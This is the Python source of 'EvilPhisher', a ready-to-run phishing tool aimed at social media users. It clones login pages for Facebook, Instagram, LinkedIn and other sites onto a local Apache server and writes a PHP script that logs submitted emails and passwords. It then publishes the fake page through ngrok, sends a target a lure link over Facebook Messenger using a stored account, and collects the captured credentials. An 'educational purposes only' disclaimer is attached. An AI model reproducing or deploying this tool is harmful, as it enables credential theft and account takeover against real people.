#!/usr/bin/python
############################
# Name : evilphisher
# Coder: Krypt0mux
############################

"""
Import Modules
"""
import datetime
import os
import time
import urllib
import json
import sys
import subprocess
import ConfigParser
from fbchat import Client
from fbchat.models import *
from colorama import Fore,Style


"""
Phisher Class
"""
class Phisher:

    """
    Deliver the malicious link
    """
    #
    # TODO: Email option will be implemented soon!!!.
    #
    def deliver(self, linkhttps, linkhttp):
        fbdel = raw_input(Style.RESET_ALL + Style.BRIGHT + Fore.WHITE + "Do you want to deliver to FB Messenger [Y/n]: ")
        while fbdel == "":
              fbdel = raw_input(Style.RESET_ALL + Style.BRIGHT + Fore.WHITE + "Do you want to deliver to FB Messenger [Y/n]: ")


        # Send the link to a FB User..
        if (fbdel == "Y" or fbdel == "Yes" or fbdel == "yes" or fbdel == "y"):
            self.send_fb_message(linkhttps, linkhttp)


    """
    Send a facebook message.
    """
    def send_fb_message(self,linkhttps, linkhttp):
        config = ConfigParser.RawConfigParser()
        config.read("config.cfg")

        email    = config.get("FB", "EMAIL")
        password = config.get("FB", "PASSWORD")
        message  = config.get("FB", "MESSAGE")
        user_id  = config.get("FB", "USER_ID")

        try:

            print(Style.RESET_ALL + Style.BRIGHT + Fore.BLUE + "[ + ] " +
                  Style.RESET_ALL + Style.BRIGHT + Fore.WHITE + "READING " +
                  Style.RESET_ALL + Style.BRIGHT + Fore.GREEN + "CONFIG " +
                  Style.RESET_ALL + Style.BRIGHT + Fore.WHITE + "FILE")
            time.sleep(1)
            while (email == "" and password == "" and message == "" and user_id == ""):
                print(Style.RESET_ALL + Style.BRIGHT + Fore.BLUE + "[ + ] " +
                      Style.RESET_ALL + Style.BRIGHT + Fore.RED + "CONFIGURATION " +
                      Style.RESET_ALL + Style.BRIGHT + Fore.RED + "FILE " +
                      Style.RESET_ALL + Style.BRIGHT + Fore.RED+ "EMPTY")

            try:
                # Login to the account.
                client = Client(email, password)
                if (client.isLoggedIn()):

                    print(Style.RESET_ALL + Style.BRIGHT + Fore.YELLOW + """
                             \t\t\tSome useful information that EvilPhisher found.
                             """)

                    # Fetch some useful information.
                    user = client.searchForUsers(user_id)[0]
                    if user != "":

                        print(Style.RESET_ALL + Style.BRIGHT + Fore.LIGHTCYAN_EX + "\t\t\t User's UID {}".format(user.uid))
                        print(Style.RESET_ALL + Style.BRIGHT + Fore.LIGHTCYAN_EX + "\t\t\t User's Name {}".format(user.name))
                        print(Style.RESET_ALL + Style.BRIGHT + Fore.LIGHTCYAN_EX + "\t\t\t User's Photo {}".format(user.photo))
                        print(Style.RESET_ALL + Style.BRIGHT + Fore.LIGHTCYAN_EX + "\t\t\t User's Is Friend {}".format(user.is_friend))
                        print("\n")
                        # Send the message.
                        send = raw_input(Style.RESET_ALL + Style.BRIGHT + Fore.WHITE + "Do you want to send the message now [Y/n]: ")
                        while send == "":
                              send = raw_input(
                                Style.RESET_ALL + Style.BRIGHT + Fore.WHITE + "Do you want to send the message now [Y/n]: ")

                        if (send == "Y" or send == "Yes" or send == "yes" or send == "y"):

                            is_https = raw_input(
                                Style.RESET_ALL + Style.BRIGHT + Fore.WHITE + "Do you want to use HTTPS [Y/n]: ")

                            while is_https == "":
                                  is_https = raw_input(
                                    Style.RESET_ALL + Style.BRIGHT + Fore.WHITE + "Do you want to use HTTPS [Y/n]: ")


                            if (is_https == "Y" or is_https == "Yes" or is_https == "yes" or is_https == "y"):

                                # Replace {name} with the user's name.
                                newMsg = str(message).replace("{name}", user.name)

                                # Send it now.
                                client.send(Message(text=newMsg + "\n\n" + linkhttps), thread_id=user_id, thread_type=ThreadType.USER)

                                print(Style.RESET_ALL + Style.BRIGHT + Fore.BLUE + "[ + ] " +
                                Style.RESET_ALL + Style.BRIGHT + Fore.GREEN + "MESSAGE " +
                                Style.RESET_ALL + Style.BRIGHT + Fore.GREEN + "SENT. >:) ")

                                time.sleep(5)
                            else:
                                # Replace {name} with the user's name.
                                newMsg = str(message).replace("{name}", user.name)

                                # Send it now.
                                client.send(Message(text=newMsg + "\n\n" + linkhttp), thread_id=user_id,
                                            thread_type=ThreadType.USER)

                                print(Style.RESET_ALL + Style.BRIGHT + Fore.BLUE + "[ + ] " +
                                      Style.RESET_ALL + Style.BRIGHT + Fore.GREEN + "MESSAGE " +
                                      Style.RESET_ALL + Style.BRIGHT + Fore.GREEN + "SENT. >:) ")

                                time.sleep(5)


            except FBchatException:
                print(Style.RESET_ALL + Style.BRIGHT + Fore.BLUE + "[ + ] " +
                      Style.RESET_ALL + Style.BRIGHT + Fore.RED + "LOGIN " +
                      Style.RESET_ALL + Style.BRIGHT + Fore.RED + "FAILED!! ")
                sys.exit(1)

        except KeyboardInterrupt:
            return





    """
    Run the phisher
    """
    def run(self, option):
        if (option == "1"):
            self.clone("facebook")
        if (option == "2"):
            self.clone("instagram")
        if (option == "3"):
            self.clone("linkedin")
        if (option == "4"):
            self.clone("snapchat")
        if (option == "5"):
            self.clone("myspace")
        if (option == "6"):
            self.clone("tumblr")
        if (option == "7"):
            self.clone("reddit")
        if (option == "8"):
            self.clone("pinterest")
    """
    Clone the site
    """
    def clone(self, site):

        print(Style.RESET_ALL + Style.BRIGHT + Fore.BLUE + "\n[ + ] " +
              Style.RESET_ALL + Style.BRIGHT + Fore.WHITE + "CLONING [ " +
              Style.RESET_ALL + Style.BRIGHT + Fore.GREEN + site +
              Style.RESET_ALL + Style.BRIGHT + Fore.WHITE + " ]")

        # Changing Permissions.
        subprocess.call(["chmod", "777", "/var/www/html"])


        """
         Copy the websites to var/www/html
        """
        time.sleep(1)
        if (site == "facebook"):
            subprocess.call(["cp", "-r", "sites/facebook/index.html", "/var/www/html"])
            subprocess.call(["cp", "-r", "sites/facebook/index_files", "/var/www/html"])

        if (site == "instagram"):
            subprocess.call(["cp", "-r", "sites/instagram/index.html", "/var/www/html"])
            subprocess.call(["cp", "-r", "sites/instagram/index_files", "/var/www/html"])

        if (site == "linkedin"):
            subprocess.call(["cp", "-r", "sites/linkedin/index.html", "/var/www/html"])
            subprocess.call(["cp", "-r", "sites/linkedin/index_files", "/var/www/html"])

        if (site == "snapchat"):
            subprocess.call(["cp", "-r", "sites/snapchat/index.html", "/var/www/html"])
            subprocess.call(["cp", "-r", "sites/snapchat/index_files", "/var/www/html"])

        if (site == "myspace"):
            subprocess.call(["cp", "-r", "sites/myspace/index.html", "/var/www/html"])
            subprocess.call(["cp", "-r", "sites/myspace/index_files", "/var/www/html"])

        if (site == "tumblr"):
            subprocess.call(["cp", "-r", "sites/tumblr/index.html", "/var/www/html"])
            subprocess.call(["cp", "-r", "sites/tumblr/index_files", "/var/www/html"])

        if (site == "reddit"):
            subprocess.call(["cp", "-r", "sites/reddit/index.html", "/var/www/html"])
            subprocess.call(["cp", "-r", "sites/reddit/index_files", "/var/www/html"])

        if (site == "pinterest"):
            subprocess.call(["cp", "-r", "sites/pinterest/index.html", "/var/www/html"])
            subprocess.call(["cp", "-r", "sites/pinterest/index_files", "/var/www/html"])



        # Starting the webserver.
        time.sleep(1)
        print(Style.RESET_ALL + Style.BRIGHT + Fore.BLUE + "[ + ] " +
              Style.RESET_ALL + Style.BRIGHT + Fore.WHITE + "STARTING " +
              Style.RESET_ALL + Style.BRIGHT + Fore.GREEN + "PHISHING " +
              Style.RESET_ALL + Style.BRIGHT + Fore.WHITE + "SERVER")
        subprocess.call(["service", "apache2", "restart"])


        # Redirect to site afterwards
        redir = raw_input(Style.RESET_ALL + Style.BRIGHT + Fore.WHITE + "\nRedirect URL: (https, http) ")
        while redir == "" or "http" not in redir or "https" not in redir:
              redir = raw_input(Style.RESET_ALL + Style.BRIGHT + Fore.WHITE + "\nRedirect URL: (https, http) ")

        print(Style.RESET_ALL + Style.BRIGHT + Fore.WHITE + "\nREDIRECT URL [ " +
              Style.RESET_ALL + Style.BRIGHT + Fore.GREEN + redir +
              Style.RESET_ALL + Style.BRIGHT + Fore.WHITE + " ]")
        time.sleep(1)

        # Create phishing script
        print(Style.RESET_ALL + Style.BRIGHT + Fore.BLUE + "[ + ] " +
              Style.RESET_ALL + Style.BRIGHT + Fore.CYAN + "CREATING EVIL PHISHING SCRIPT...")
        s = open('/var/www/html/post.php', 'w')
        s.write(
"""
<?php
header('Location: %s');
$handle = fopen('credentials.txt', 'a');
foreach ( $_POST as $variable => $value ) {

    if ($variable == "email") {
        fwrite($handle, $value);
        fwrite($handle, ':');
    }
    
    if ($variable == "pass") {
        fwrite($handle, $value);
        fwrite($handle, "\\n");
        break;
    }
}
exit;
?>        
        
""" % redir)
        s.close()
        time.sleep(1)

        # Using Ngrok to port forward
        time.sleep(1)
        print(Style.RESET_ALL + Style.BRIGHT + Fore.BLUE + "[ + ] " +
              Style.RESET_ALL + Style.BRIGHT + Fore.WHITE + "PORT FORWARDING USING " +
              Style.RESET_ALL + Style.BRIGHT + Fore.GREEN + "NGROK")
        os.system("./ngrok http 80  > /dev/null &")
        time.sleep(5)
        r = urllib.urlopen("http://localhost:4040/api/tunnels")
        j = json.loads(r.read())

        print(Style.RESET_ALL + Style.BRIGHT + Fore.BLUE + "\nALL READY!!\n")
        time.sleep(1)


        # Deliver the message.
        self.deliver(j['tunnels'][0]['public_url'],j['tunnels'][1]['public_url'])

        # Print out the screen that captures the Credentials
        subprocess.call(["clear"])
        menu = Menu()
        menu.banner()
        print(Style.RESET_ALL + Style.BRIGHT + Fore.LIGHTBLACK_EX +
              "\t\t==============================================================\n")
        print(Style.RESET_ALL + Style.BRIGHT + Fore.CYAN +
              """\t\tUse Your Social Engineering Skills To Get Someone To Type In
                 \t\tThere Username And Password.\n""")

        print(Style.RESET_ALL + Style.BRIGHT + Fore.GREEN + "\t\t\t\tHTTPS: " +
              Style.RESET_ALL + Style.BRIGHT + Fore.WHITE + j['tunnels'][0]['public_url'])

        print(Style.RESET_ALL + Style.BRIGHT + Fore.GREEN + "\t\t\t\tHTTP:  " +
              Style.RESET_ALL + Style.BRIGHT + Fore.WHITE + j['tunnels'][1]['public_url'] + "\n")

        print(Style.RESET_ALL + Style.BRIGHT + Fore.LIGHTBLACK_EX +
              "\t\t==============================================================\n")

        print(Style.RESET_ALL + Style.BRIGHT + Fore.WHITE +
              "\t\t\t\tWAIT FOR CREDENTIALS")
        print(Style.RESET_ALL + Style.BRIGHT + Fore.WHITE +
              "\t\t\t\t=====================\n")

        global cnt
        try:
            if os.path.isfile("/root/EvilPhisher/creds/credentials.txt"):
                os.system("rm /root/EvilPhisher/creds/credentials.txt")
            if os.path.isfile("/var/www/html/credentials.txt"):
                os.system("rm /var/www/html/credentials.txt")

            passwords = open('/root/EvilPhisher/creds/saved/passwords_%s.txt' % datetime.datetime.now().time(), 'w')

            # Read in credentials
            tmp = 0
            cnt = 0
            while True:

                if os.path.isfile("/var/www/html/credentials.txt"):

                    # Read the file.
                    f = open('/var/www/html/credentials.txt', 'r')
                    cnt = len(f.readlines())
                    subprocess.call(["cp", "/var/www/html/credentials.txt", "/root/EvilPhisher/creds/"])

                    if (tmp < cnt):

                        f = open('/var/www/html/credentials.txt', 'r')
                        lines = f.readlines()[cnt-1]
                        line  = str(lines)
                        cred  = line.split(":")
                        print(Style.RESET_ALL + Style.BRIGHT + Fore.WHITE + "\t\tEmail: " +
                              Style.RESET_ALL + Style.BRIGHT + Fore.GREEN + cred[0] +
                              Style.RESET_ALL + Style.BRIGHT + Fore.WHITE + " Password: " +
                              Style.RESET_ALL + Style.BRIGHT + Fore.GREEN + cred[1])

                        passwords.write("Email: %s Password: %s" % (cred[0], cred[1]))
                        f.close()
                        tmp = cnt
                    f.close()

        except KeyboardInterrupt:
            passwords.close()
            print(Style.RESET_ALL + Style.BRIGHT + Fore.LIGHTGREEN_EX + "Passwords are saved under EvilPhisher/creds/saved/")
            print(Style.RESET_ALL + Style.BRIGHT + Fore.CYAN + "All done, Happy Hacking..")
            sys.exit(1)






"""
Menu
"""
class Menu:

    """
    Print out the banner
    """
    def banner(self):
        subprocess.call(["clear"])
        print(Style.RESET_ALL + Style.DIM + Fore.LIGHTBLACK_EX + """
  

    888'Y88           ,e, 888   888 88e  888     ,e,       888                   
    888 ,'Y Y8b Y888P  "  888   888 888D 888 ee   "   dP"Y 888 ee   ,e e,  888,8,
    888C8    Y8b Y8P  888 888   888 88"  888 88b 888 C88b  888 88b d88 88b 888 " 
    888 ",d   Y8b "   888 888   888      888 888 888  Y88D 888 888 888   , 888   
    888,d88    Y8P    888 888   888      888 888 888 d,dP  888 888  "YeeP" 888                              
                                                                                                         
        """)
        print(Style.RESET_ALL + Style.BRIGHT + Fore.YELLOW + "\t\t\t\tSocial Media Phisher")
        print(Style.RESET_ALL + Style.BRIGHT + Fore.WHITE + "\t\t\t\t----------------------")
        print(Style.RESET_ALL + Style.BRIGHT + Fore.LIGHTRED_EX  + "\t\t\t\tCoded By: Krypt0mux")


    """
    The attack menu
    """
    def menu(self):
        self.banner()

        print(Style.RESET_ALL + Style.BRIGHT + Fore.BLUE + """
        \tDo you agree to use this tool for educational purposes only.
        \tif not, any damage to any system or legal reprocutions for 
        \tillegal use are yours and not EvilPhishers responsability.
        """)

        try:

            agreement = raw_input(Style.RESET_ALL + Style.BRIGHT + Fore.GREEN + "\t\t    Do you Agree to accept your own responsability " +
                                  Style.RESET_ALL + Style.BRIGHT + Fore.WHITE + "[Y/N] ")

        except KeyboardInterrupt:
            print(Style.RESET_ALL + Style.BRIGHT + Fore.CYAN + "\n\nAll done, Happy Hacking..")
            sys.exit(1)
        """
        Check to see if we agree to the terms and conditions
        """
        if (agreement == "Y" or agreement == "y" or agreement == "yes" or agreement == "YES"):

            # Created the directory
            if os.path.isdir("/root/EvilPhisher/creds/saved") == False:
                subprocess.call(["mkdir", "/root/EvilPhisher/creds/saved"])

            subprocess.call(["clear"])
            self.banner()

            print(Style.RESET_ALL + Style.BRIGHT + Fore.LIGHTBLUE_EX + """
            This is where you select which site you want to clone to phish for
            passwords.
            """)
            print(Style.RESET_ALL + Style.BRIGHT + Fore.WHITE + """
                    1.) Facebook
                    2.) Instagram
                    3.) LinkedIn
                    4.) Snapchat
                    5.) MySpace (No-Redirect)
                    6.) Tumblr  (No-Redirect)
                    7.) Reddit
                    8.) Pinterest
            """)

            try:


                # Try getting use input, until the string is not null
                option = raw_input(Style.RESET_ALL + Style.BRIGHT + Fore.LIGHTCYAN_EX + "Enter site to clone: ")
                while option == "":
                      option = raw_input(Style.RESET_ALL + Style.BRIGHT + Fore.LIGHTCYAN_EX + "Enter site to clone: ")


                # Run the phishing attack.
                phisher = Phisher()
                phisher.run(option)

            except KeyboardInterrupt:
                print(Style.RESET_ALL + Style.BRIGHT + Fore.CYAN + "\n\nAll done, Happy Hacking..")
                sys.exit(1)



        else:
            print(Style.RESET_ALL + Style.BRIGHT + Fore.RED + """
            \t\t  You disagreed, you cannot use this tool. Exiting..
            """)
            sys.exit(1)


"""
Run the menu
"""
menu = Menu()
menu.menu()
